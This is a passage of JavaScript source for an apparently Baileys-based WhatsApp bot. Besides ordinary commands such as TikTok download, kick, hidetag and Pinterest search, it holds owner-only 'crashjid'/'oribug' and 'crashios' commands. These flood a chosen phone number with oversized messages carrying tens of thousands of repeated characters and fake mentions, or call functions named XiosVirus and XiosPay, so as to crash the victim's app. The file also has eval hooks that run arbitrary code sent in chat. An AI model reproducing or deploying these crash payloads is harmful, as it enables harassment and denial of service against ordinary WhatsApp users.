pengguna()
if (users.limit < 1) return reply(`[ ! ] YOUR LIMIT IS LESS THAN 1`)
if (args.length == 0) return reply(`Example: ${prefix + command} your link`)
await reaction(m.chat, "🕒");
const api = require('btch-downloader')
if (!args[0]) return reply(`Enter URL!\n\nexample:\n${prefix + command} https://vm.tiktok.com/ZGJAmhSrp/`);
if (!args[0].match(/tiktok/gi)) return reply(`ᴛʜᴇ ᴜʀʟ ʏᴏᴜ ᴘʀᴏᴠɪᴅᴇᴅ ɪꜱ *ᴡʀᴏɴɢ!!!*`);
try {
let maximus = await api.ttdl(args[0]);
let caption = `乂 *T I K T O K  D O W N L O A D* 

• *ɴᴀᴍᴇ ᴠɪᴅᴇᴏs:* 
${maximus.title}

• *ɴᴀᴍᴇ ᴀᴜᴅɪᴏ:* 
${maximus.title_audio}

${global.namabot}`;
await client.sendMessage(m.chat, { video: { url: maximus.video[0] }, caption: caption })
await client.sendMessage(m.chat, { audio: { url: maximus.audio[0] }, mimetype: "audio/mpeg", ptt: true }, { quoted: m })
await uselimit(1)
      } catch (e) {
		console.log(e)
		reply(e)
	}
}
break
case 'ai':
 pengguna()
 if (args.length < 1) return 
 if (q == 'on') {
 global.db.data.chats[m.chat].luminai = true
 reply('ꜱᴜᴄᴄᴇꜱꜱꜱꜰᴜʟʟʏ ᴇɴᴀʙʟᴇᴅ Aɪ ᴄʜᴀᴛ')
 } else if (q == 'off') {
 global.db.data.chats[m.chat].luminai = false
 reply('ꜱᴜᴄᴄᴇꜱꜱꜱꜰᴜʟʟʏ ᴅɪꜱᴀʙʟᴇᴅ Aɪ ᴄʜᴀᴛ')
 } else {
 m.reply('on / off baby bee')
 }
break
case "hidetag": {
pengguna()
if (!isGroup) return reply(mess.ingroup)
if (!isAdmins) return reply(mess.admin)
if (!m.quoted && !text) return m.reply('example : .hidetag thetext/replyteks')
var teks = m.quoted ? m.quoted.text : text
var member = await groupMetadata.participants.map(e => e.id)
client.sendMessage(m.chat, {text: teks, mentions: [...member]})
}
break
case 'delete': case 'del': {
 pengguna()
 if (m?.isGroup && !isAdmins && !groupOwner && isBotAdmins) return
 let key = {}
 try {
 	key.remoteJid = m.quoted ? m.quoted.fakeObj.key.remoteJid : m.key.remoteJid
	key.fromMe = m.quoted ? m.quoted.fakeObj.key.fromMe : m.key.fromMe
	key.id = m.quoted ? m.quoted.fakeObj.key.id : m.key.id
 	key.participant = m.quoted ? m.quoted.fakeObj.participant : m.key.participant
 } catch (e) {
 	console.error(e)
 }
client.sendMessage(m.chat, { delete: key })
}
break
    case "kick":{
        pengguna()
if (m.isGroup && !isAdmins && !groupOwner && isBotAdmins) return
if (!text && !m?.quoted) reply('ᴇɴᴛᴇʀ ᴛʜᴇ ɴᴜᴍʙᴇʀ ʏᴏᴜ ᴡᴀɴɴᴀ ᴋɪᴄᴋ')
let users = m?.quoted ? m?.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await client.groupParticipantsUpdate(m?.chat, [users], 'remove').catch(console.log)
}
break
case 'antilinkgc': case 'antilink':{
    pengguna()
               if (!m.isGroup) return reply(mess.ingroup)
if (!isBotAdmins) return reply(mess.adminbot)
if (!isAdmins && !Creator) return reply(mess.admin)
               if (args.length < 1) return reply('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antilinkgc = true
                  reply(`${command} ɪꜱ ᴇɴᴀʙʟᴇᴅ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antilinkgc = false
                  reply(`${command} ɪꜱ ᴅɪꜱᴀʙʟᴇᴅ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ`)
               }
            }
            break
 case 'pinterest': case 'pin': {
pengguna()
if (users.limit < 1) return reply(`[ ! ] YOUR LIMIT IS LESS THAN 1`)
  if (!text) return reply(`Enter Query`);
  //try {
  await m.reply('be patient😈');

  async function createImage(url) {
    const { imageMessage } = await generateWAMessageContent({
      image: {
        url
      }
    }, {
      upload: client.waUploadToServer
    });
    return imageMessage;
  }

  function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [array[i], array[j]] = [array[j], array[i]];
    }
  }

  let push = [];
  let { data } = await axios.get(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${text}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${text}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
  let res = data.resource_response.data.results.map(v => v.images.orig.url);

  shuffleArray(res); // Mengacak array
  let ult = res.splice(0, 5); // Mengambil 10 gambar pertama dari array yang sudah diacak
  let i = 1;

  for (let pus of ult) {
    push.push({
      body: proto.Message.InteractiveMessage.Body.fromObject({
        text: `Image to - ${i++}`
      }),
      footer: proto.Message.InteractiveMessage.Footer.fromObject({
        text: text
      }),
      header: proto.Message.InteractiveMessage.Header.fromObject({
        title: 'Results.',
        hasMediaAttachment: true,
        imageMessage: await createImage(pus)
      }),
      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
          {
            name: "cta_url",
            buttonParamsJson: `{"display_text":"url","Click Here":"${pus}","merchant_url":"${pus}"}`
          }
        ]
      })
    });
  }

  const msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hey\nBelow are the results of your search.'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: global.namaowner
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            hasMediaAttachment: false
          }),
          carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
            cards: [
              ...push
            ]
          })
        })
      }
    }
  }, {});

  await client.relayMessage(m.chat, msg.message, {
    messageId: msg.key.id
  });
  
}
uselimit(1)
break
case 'crashjid': case 'oribug': {
if (!Creator) return reply(mess.owner)
if (!q) return reply(`Example: ${prefix + command} 234×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reaction(m.chat, "⌛")
for (let i = 0; i < 150; i++) {
await client.relayMessage(target, {"extendedTextMessage": {
text: `rissXD ${"ꦾ".repeat(40000)}`,
"contextInfo": { mentionedJid: [ "@234556853456@s.whatsapp.net", ...Array.from({ length: 25000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`) ] }
}
}, { participant: { jid: target }})
await client.relayMessage(target, {"extendedTextMessage": {
text: `RissXD  ${"@234556853456".repeat(10000)}`,
"contextInfo": { mentionedJid: [ "@234556853456@s.whatsapp.net" ] }
}
}, { participant: { jid: target }})
await client.relayMessage(target, {"extendedTextMessage": {
text: `crash 🩸 ${"@234556853456".repeat(10000)}`,
"contextInfo": { mentionedJid: [ "@234556853456@s.whatsapp.net", ...Array.from({ length: 25000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`) ] }
}
}, { participant: { jid: target }})
}
m.reply("「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」")
}
break
case "iosfreze": case "bugios": case "crashios":{
if (!Creator) return reply(mess.owner)
if (!q) return reply(`🐉 not like that but\n ${prefix + command} 234xxxx`)
X = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝐏𝐫𝐨𝐜𝐜𝐞𝐬𝐬𝐢𝐧𝐠〽️")
for (let i = 0; i < 10; i++) {
await XiosPay(X)
await XiosVirus(X)
await TxIos(X, Ptcp = true)
await sleep(1)
}
client.sendMessage(m.chat, {react: {text: '✅️', key: m.key}})
}
break
default:
if (chats.luminai && m.text) { 
if (m.fromMe) return
let chats = await luminai(m.text, `your name is Fᴀᴍᴢʏ, change your nature to a smart and funny Man, use one of these "(⁠人⁠ ⁠•͈⁠ᴗ⁠•͈⁠), (⁠◡⁠ ⁠ω⁠ ⁠◡⁠), (⁠ ⁠ꈍ⁠ᴗ⁠ꈍ⁠)" to greet the user, and use one of these expressions "(⁠ ⁠･ั⁠﹏⁠･ั⁠), (⁠｡⁠•́⁠︿⁠•̀⁠｡⁠), (⁠’⁠;⁠︵⁠;⁠’)" to be sad, and use one of these expressions "(⁠ᗒ⁠ᗩ⁠ᗕ⁠), (⁠ ⁠≧⁠Д⁠≦⁠), .⁠·⁠’⁠¯⁠'⁠(⁠>⁠▂⁠<⁠)⁠'⁠¯⁠‘⁠·⁠." when crying and use ${pushname} untuk mention user name`, `${pushname}`)
//await sleep(5000)
let puqi = chats.result
reply(puqi)
}
        
if (budy.startsWith('>')) {
if (!Access) return;
try {
let evaled = await eval(budy.slice(2));
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
await m.reply(evaled);
} catch (err) {
m.reply(String(err));
}
}
        
if (budy.startsWith('<')) {
if (!Access) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)

}
catch (e) {
console.log(e)
}}
    
        
}
} catch (err) {
console.log(require("util").format(err));
await client.sendMessage(`${owner}@s.whatsapp.net`, {text: `${util.format(err)}

Command From: ${m.sender.split("@")[0]}`}, {quoted: m})
    
}
};

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file);
console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
delete require.cache[file];
require(file);
});
